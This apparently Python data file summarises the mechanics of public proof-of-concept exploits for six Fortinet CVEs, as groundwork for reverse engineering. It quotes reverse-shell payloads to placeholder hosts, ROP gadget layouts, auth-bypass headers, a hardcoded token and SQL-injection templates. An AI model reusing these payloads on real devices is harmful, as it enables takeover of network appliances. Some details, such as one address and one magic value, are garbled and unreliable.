"""
Fortinet CVE PoC reverse engineering -- exploit mechanics and internals
Sources:
  - cve-pocs/CVE-2024-21762/poc.py (FortiOS sslvpnd OOB write)
  - cve-pocs/CVE-2024-55591/CVE-2024-55591.py (FortiOS WebSocket CLI auth bypass)
  - cve-pocs/CVE-2022-40684/UserEnum.py (FortiOS auth bypass via Forwarded header)
  - watchtowr-research/Fortijump-Exploit-CVE-2024-47575/CVE-2024-47575.py (FMG RCE)
  - watchtowr-research/watchTowr-vs-FortiSIEM-CVE-2025-25256.py (FortiSIEM RCE)
  - watchtowr-research/watchTowr-vs-FortiWeb-CVE-2025-25257.py (FortiWeb SQLi->RCE)
Products: FortiOS, FortiManager, FortiSIEM, FortiWeb
"""

# ---------------------------------------------------------
# CVE-2024-21762: FortiOS sslvpnd OOB write -> ROP -> Node.js exec
# ---------------------------------------------------------
CVE_2024_21762 = {
    "cve":      "CVE-2024-21762",
    "product":  "Fortinet FortiOS -- sslvpnd",
    "cvss":     "9.6 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "class":    "Heap OOB write via malformed form value; pre-auth RCE",
    "endpoint": "POST /remote/hostcheck_validate (SSL VPN hostcheck endpoint)",
    "source":   "cve-pocs/CVE-2024-21762/poc.py",
}

CVE_2024_21762_MECHANICS = {
    "attack_mechanism": (
        "Two-request exploit sequence: "
        "Request 1: POST /remote/hostcheck_validate with body (B*1808 = form_value & )*20. "
        "form_value structure: "
        "  11 bytes pad + /bin/node (bin_node) + 6 bytes pad + -e (e_flag) + 14 bytes pad + js_payload "
        "  + 438 bytes pad + pivot_2 + getcwd_ptr "
        "  + 32 bytes pad + pivot_1 "
        "  + 168 bytes pad + call_execl "
        "  + 432 bytes pad + ssl_do_handshake_ptr "
        "  + 32 bytes pad + rop_chain + pivot_3. "
        "Request 2: POST / HTTP/1.1 Transfer-Encoding: chunked "
        "  body: '0'*4137 + \\x00 + 'A' + \\r\\n\\r\\n. "
        "The second request triggers the OOB write using a malformed chunked transfer encoding body "
        "that causes sslvpnd to read past the end of a heap buffer."
    ),

    "rop_gadgets": {
        "ssl_do_handshake_ptr": "0x0042ce60 -- ssl_do_handshake function ptr (used as ROP anchor)",
        "getcwd_ptr":           "0x042c6270 -- getcwd function ptr",
        "pivot_1":              "0x00fdf752 -- push rdi; pop rsp; ret; (stack pivot: rdi -> rsp)",
        "pivot_2":              "0x02abc9ac -- add rsp, 0x2a0; pop rbx; pop r12; pop rbp; ret;",
        "pivot_3":              "0x024d3fe0 -- add rsp, 0xd90; pop rbx; pop r12; pop rbp; ret;",
        "call_execl":          "0x0043c180 -- call execl (executes /bin/node -e <payload>)",
        "shl_rax_4":           "0x0286 52c6 -- shl rax, 4; add rax, rdx; ret; (offset arithmetic)",
    },

    "gadget_addresses_note": (
        "Gadget addresses are fixed (not ASLR-randomized). "
        "sslvpnd is likely compiled without PIE -- the binary has a fixed load address. "
        "This is consistent with FortiOS's embedded Linux environment where sslvpnd "
        "has historically been linked as a non-PIE binary (confirmed in CVSS AV:N/AC:L -- low complexity). "
        "For ablation: semantic sweep for execl callsite, ssl_do_handshake, and getcwd references "
        "in sslvpnd binary will locate these functions by behavior, not by address."
    ),

    "node_js_payload": {
        "binary":    "/bin/node",
        "flag":      "-e",
        "detection_payload": "(function(){var cp=require('child_process');cp.execSync('nslookup <oastify>');})();",
        "revshell_payload":  "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/node',['-i']);var client=new net.Socket();client.connect(1337,'<attacker>',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();",
    },

    "re_insight": (
        "Node.js (/bin/node) on FortiGate: this confirms FortiOS ships Node.js in the base image. "
        "The exploitability depends on the attacker knowing /bin/node exists. "
        "Ablation semantic sweep: search for 'execl', 'node', '/bin/' string references in sslvpnd "
        "to confirm the binary ships with knowledge of /bin/node path. "
        "The stack pivot gadget sequence (push rdi; pop rsp) is a standard GLIBC/x64 pattern -- "
        "ablation semantic sweep for 'pop rsp' or 'stack pivot' in sslvpnd surfaces the ROP surface."
    ),
}


# ---------------------------------------------------------
# CVE-2024-55591: FortiOS WebSocket CLI auth bypass -- hardcoded 'GIANTYELLOWDUCK' token
# ---------------------------------------------------------
CVE_2024_55591 = {
    "cve":      "CVE-2024-55591",
    "product":  "Fortinet FortiOS / FortiProxy -- CLI WebSocket endpoint",
    "cvss":     "9.6 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "class":    "Authentication bypass via hardcoded static local access token; pre-auth CLI access",
    "endpoint": "wss://<target>/ws/cli/?local_access_token=GIANTYELLOWDUCK",
    "source":   "cve-pocs/CVE-2024-55591/CVE-2024-55591.py",
}

CVE_2024_55591_MECHANICS = {
    "hardcoded_token": {
        "value":    "GIANTYELLOWDUCK",
        "param":    "local_access_token (WebSocket URL query param)",
        "endpoint": "/ws/cli/ (FortiOS CLI over WebSocket)",
        "purpose":  "Intended for local/loop-back CLI access; accidentally exposed on public interface",
    },

    "exploit_payload": (
        "DEFAULT_EXPLOIT_PAYLOAD_TEMPLATE = "
        "'\"<username>\" \"admin\" \"root\" \"super_admin\" \"root\" \"none\" [127.0.0.1]:1337 [127.0.0.1]:1337\\n'. "
        "This impersonates a legitimate admin session with the format expected by the FortiOS CLI WebSocket handler. "
        "After sending the impersonation payload, arbitrary CLI commands are sent as subsequent WebSocket frames."
    ),

    "access_level": (
        "The username field in the payload is the requested admin name. "
        "With 'super_admin' in the payload, the attacker gains full FortiOS CLI access equivalent to "
        "a super_admin account. All FortiOS CLI commands available: show full-configuration, "
        "execute factoryreset, config system admin create, diagnose debug application sslvpnd. "
        "This is the highest possible privilege level."
    ),

    "re_insight": (
        "The 'GIANTYELLOWDUCK' token is a static string compiled into the FortiOS httpsd or "
        "websockd binary. "
        "Ablation semantic sweep for 'GIANTYELLOWDUCK' or 'local_access_token' in FortiOS httpsd binary "
        "reveals the handler function for the /ws/cli/ endpoint. "
        "The function should check: is the source IP 127.0.0.1 AND local_access_token == 'GIANTYELLOWDUCK'. "
        "The bug: the source IP check failed or was not implemented, allowing remote connections "
        "to authenticate with the local token."
    ),
}


# ---------------------------------------------------------
# CVE-2022-40684: FortiOS auth bypass via Forwarded header + User-Agent spoofing
# ---------------------------------------------------------
CVE_2022_40684 = {
    "cve":      "CVE-2022-40684",
    "product":  "Fortinet FortiOS / FortiProxy / FortiSwitchManager",
    "cvss":     "9.8 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "class":    "Authentication bypass via HTTP header spoofing; arbitrary config read/write",
    "endpoint": "GET /api/v2/cmdb/system/admin (and any other /api/v2/cmdb/ endpoint)",
    "source":   "cve-pocs/CVE-2022-40684/UserEnum.py",
}

CVE_2022_40684_MECHANICS = {
    "bypass_headers": {
        "Forwarded": "for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;",
        "User-Agent": "Report Runner",
    },

    "mechanism": (
        "FortiOS's API authentication checks the Forwarded header's 'for' address. "
        "If 'for' is 127.0.0.1 and User-Agent is 'Report Runner', "
        "FortiOS treats the request as coming from a trusted local process. "
        "This bypasses the normal API key or session token check. "
        "Impact: GET /api/v2/cmdb/system/admin returns all admin accounts with accprofile values. "
        "Write access: PUT to any /api/v2/cmdb/ endpoint to modify config, create admins, "
        "change passwords, modify firewall policies."
    ),

    "re_insight": (
        "The auth bypass is in FortiOS's httpsd binary -- the API authentication handler. "
        "The handler checks: "
        "  if (user_agent == 'Report Runner' && forwarded_for == '127.0.0.1'): skip_auth = true. "
        "Ablation semantic sweep for 'Report Runner' string literal in httpsd binary "
        "finds the authentication bypass handler. "
        "This is a debug/internal bypass left in production code -- "
        "the same class of mistake as the 'GIANTYELLOWDUCK' token in CVE-2024-55591."
    ),
}


# ---------------------------------------------------------
# CVE-2024-47575 (FortiJump): FortiManager fdssvrd device impersonation -> RCE
# ---------------------------------------------------------
CVE_2024_47575 = {
    "cve":      "CVE-2024-47575",
    "product":  "Fortinet FortiManager -- fdssvrd (FGFM protocol daemon)",
    "cvss":     "9.8 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "class":    "Missing device authentication in FGFM protocol; unauthenticated RCE via device impersonation",
    "endpoint": "TCP/SSL FGFM protocol (FortiManager FGFM port, typically 541 or 443)",
    "source":   "watchtowr-research/Fortijump-Exploit-CVE-2024-47575/CVE-2024-47575.py",
}

CVE_2024_47575_MECHANICS = {
    "fgfm_protocol": (
        "FGFM (FortiGate-FortiManager) protocol: FortiGate devices connect to FortiManager "
        "to register and receive management commands. "
        "fdssvrd accepts incoming FGFM connections from managed FortiGates. "
        "The exploit impersonates a FortiGate by sending FGFM 'get ip' and 'get auth' messages "
        "with a fake serial number and platform identifier."
    ),

    "impersonation_messages": {
        "get_ip": (
            "serialno=FGVMEVWG8YMT3R63\\n"
            "platform=FortiGate-VM64\\n"
            "fos_ver=700\\nmajor=7\\nminor=2\\npatch=2\\nbuild=1255\\n"
            "fg_ip=192.168.1.53\\nhostname=FGVMEVWG8YMT3R63\\n"
            "probe_mode=yes"
        ),
        "get_auth": "serialno=FGVMEVWG8YMT3R63 + platform=FortiGate-60E -- no certificate validation by fdssvrd",
    },

    "rce_payload": {
        "protocol":  "FGFM channel message",
        "framing":   "struct.pack('>II', 0x36e01100, len(request)+8) + request",
        "json_body": (
            "{method: 'exec', id: 1, params: [{url: 'um/som/export', "
            "data: {file: '`sh -i >& /dev/tcp/<lhost>/<lport> 0>&1`'}}]}"
        ),
        "injection": "Backtick command injection in the 'file' field of the um/som/export API call",
    },

    "tls_cert_bypass": (
        "w00t_cert.bin + w00t_key.bin: attacker-generated TLS certificate used to authenticate "
        "the SSL connection. fdssvrd accepts any certificate with TLS -- "
        "it does not validate that the certificate is issued by Fortinet's PKI. "
        "This is the missing authentication: fdssvrd requires a TLS cert but does not verify "
        "the cert is signed by Fortinet's CA (or the check was bypassable)."
    ),

    "re_insight": (
        "fdssvrd is the FortiManager FGFM daemon. "
        "Ablation semantic sweep for 'um/som/export', 'serialno', 'fgfm', 'get ip' strings in fdssvrd "
        "finds the FGFM message parser. "
        "The device authentication check (cert CA validation) is in the TLS handshake processing. "
        "Binary RE of fdssvrd: look for SSL_CTX_set_verify() call and verify_mode value -- "
        "if mode is SSL_VERIFY_NONE or SSL_VERIFY_PEER without depth/CA check, that is the bypass point. "
        "The backtick injection in 'file' field of um/som/export is a command injection in "
        "fdssvrd's file export path -- look for system() or popen() calls following the um/som/export handler."
    ),
}


# ---------------------------------------------------------
# CVE-2025-25256: FortiSIEM unauthenticated RCE via port 7900 binary protocol + XML injection
# ---------------------------------------------------------
CVE_2025_25256 = {
    "cve":      "CVE-2025-25256",
    "product":  "Fortinet FortiSIEM -- internal IPC service (port 7900)",
    "cvss":     "TBD (Critical expected) -- pre-auth RCE without credentials",
    "class":    "Unauthenticated RCE via command injection in XML NFS archive configuration",
    "endpoint": "TCP 7900 (FortiSIEM internal IPC, exposed on management interface)",
    "source":   "watchtowr-research/watchTowr-vs-FortiSIEM-CVE-2025-25256.py",
}

CVE_2025_25256_MECHANICS = {
    "protocol": {
        "port":    7900,
        "tls":     True,
        "framing": "16-byte little-endian header: [90, len(payload), 1075724911, 0] + XML body",
        "magic":   "0x1075724911 little-endian field -- FortiSIEM IPC magic number",
    },

    "injection_payload": {
        "xml_template": (
            "<root>"
            "<archive_storage_type>nfs</archive_storage_type>"
            "<archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>"
            "<archive_nfs_archive_dir>`{command}`</archive_nfs_archive_dir>"
            "<scope>local</scope>"
            "</root>"
        ),
        "injection_field": "archive_nfs_archive_dir",
        "injection_type":  "Shell backtick command injection (`command`)",
        "space_bypass":    "Replace space with ${IFS} (CVE-2025-25256.py line: c.replace(' ', '${IFS}'))",
    },

    "mechanism": (
        "FortiSIEM's NFS archive configuration handler on port 7900 accepts XML configuration. "
        "The archive_nfs_archive_dir field is passed to a shell command without sanitization. "
        "Backtick injection (`command`) executes arbitrary commands as the FortiSIEM service user. "
        "Port 7900 is not authenticated -- any host that can reach FortiSIEM port 7900 "
        "can execute arbitrary commands on the FortiSIEM server. "
        "FortiSIEM runs with high privileges (root or SYSTEM) as it monitors network infrastructure."
    ),

    "re_insight": (
        "FortiSIEM IPC at port 7900 is a Java or Python service. "
        "The NFS archive configuration handler calls the OS shell to mount NFS -- "
        "look for Runtime.exec() (Java) or subprocess/os.system() (Python) calls "
        "in the archive configuration processing path. "
        "The XML parser for the IPC protocol is the entry point -- "
        "search for port 7900 listener in FortiSIEM source/JAR files to find the IPC handler class."
    ),
}


# ---------------------------------------------------------
# CVE-2025-25257: FortiWeb SQLi -> Python code execution via Authorization header
# ---------------------------------------------------------
CVE_2025_25257 = {
    "cve":      "CVE-2025-25257",
    "product":  "Fortinet FortiWeb -- fabric API endpoint",
    "cvss":     "TBD (Critical expected) -- pre-auth SQLi to RCE chain",
    "class":    "SQL injection via Authorization Bearer header -> UPDATE table with Python code -> eval/exec RCE",
    "endpoint": "GET /api/fabric/device/status (FortiWeb management API)",
    "source":   "watchtowr-research/watchTowr-vs-FortiWeb-CVE-2025-25257.py",
}

CVE_2025_25257_MECHANICS = {
    "sqli_mechanism": {
        "vulnerable_header": "Authorization: Bearer '<sqli_payload>'",
        "payload_template":  "Bearer '/**/;UPDATE/**/fabric_user.user_table/**/{sql};SELECT/**/'1'",
        "sql_operation":     "UPDATE fabric_user.user_table SET token=UNHEX('<hex_encoded_payload>')",
        "chunked_write":     "Multiple UPDATE requests concatenate chunks: SET token=CONCAT(token, UNHEX('<hex_chunk>'))",
    },

    "chain_mechanism": (
        "Step 1: SQL injection via Authorization Bearer header into fabric_user.user_table. "
        "Step 2: Multiple requests write hex-encoded Python code into the token column via CONCAT. "
        "Step 3: FortiWeb reads the token value and evaluates it as Python code. "
        "Step 4: Python payload executes OS command: "
        "  import os; os.system('bash -c \"/bin/bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"'). "
        "This is a SQL injection -> stored payload -> code execution chain. "
        "FortiWeb's fabric API stores the token in the DB and evaluates it as Python "
        "at some point in the request processing -- the eval() is the code execution primitive."
    ),

    "re_insight": (
        "The Authorization header is parsed by FortiWeb's fabric API handler. "
        "The SQL injection point is in the token extraction from the Bearer value. "
        "The code execution point is wherever FortiWeb reads token from fabric_user.user_table "
        "and passes it to Python eval/exec. "
        "Ablation semantic sweep for 'eval', 'exec', 'fabric_user', 'token' in FortiWeb Python files "
        "finds the code execution sink. "
        "The use of UNHEX() and CONCAT() to write Python code in chunks is a technique for "
        "evading column length limits and WAF rules."
    ),
}


# ---------------------------------------------------------
# Cross-CVE analysis: FortiOS internal attack surface
# ---------------------------------------------------------
FORTIOS_CVE_PATTERNS = {
    "id":       "CVE-SYSTEMIC",
    "product":  "Fortinet FortiOS + FortiManager + FortiSIEM + FortiWeb",
    "severity": "CRITICAL -- systemic pattern of internal-intended features exposed to network; pre-auth RCE on multiple products",
    "class":    "Internal bypass logic exposed to network; hardcoded credentials; command injection in admin UIs",

    "pattern_1_internal_bypass_exposed": (
        "CVE-2022-40684: 'Report Runner' User-Agent + Forwarded:127.0.0.1 -- internal debug bypass. "
        "CVE-2024-55591: 'GIANTYELLOWDUCK' local_access_token -- local-only token exposed. "
        "Both are features designed for local/internal use that became network-accessible. "
        "FortiOS's network service separation failed to restrict these paths to loopback only."
    ),

    "pattern_2_command_injection_in_admin_paths": (
        "CVE-2024-47575: backtick injection in um/som/export 'file' field via FGFM protocol. "
        "CVE-2025-25256: backtick injection in archive_nfs_archive_dir via FortiSIEM IPC. "
        "Both are admin-plane operations (file export, NFS config) that pass user-controlled "
        "strings to shell commands without sanitization."
    ),

    "pattern_3_no_device_auth_in_mgmt_protocols": (
        "CVE-2024-47575 (FortiJump): fdssvrd accepts any TLS cert for FGFM device registration. "
        "No serial number validation against a known-device allowlist. "
        "Any host can impersonate a managed FortiGate and execute commands on FortiManager."
    ),

    "node_js_on_fortigate": (
        "CVE-2024-21762 PoC uses /bin/node for code execution -- Node.js is on FortiGate. "
        "FortiOS ships Node.js in the base firmware. This expands the post-exploitation surface: "
        "any code execution can use Node.js's full module system (net, child_process, fs) "
        "for persistence, lateral movement, and C2 communication -- as COATHANGER demonstrates."
    ),
}
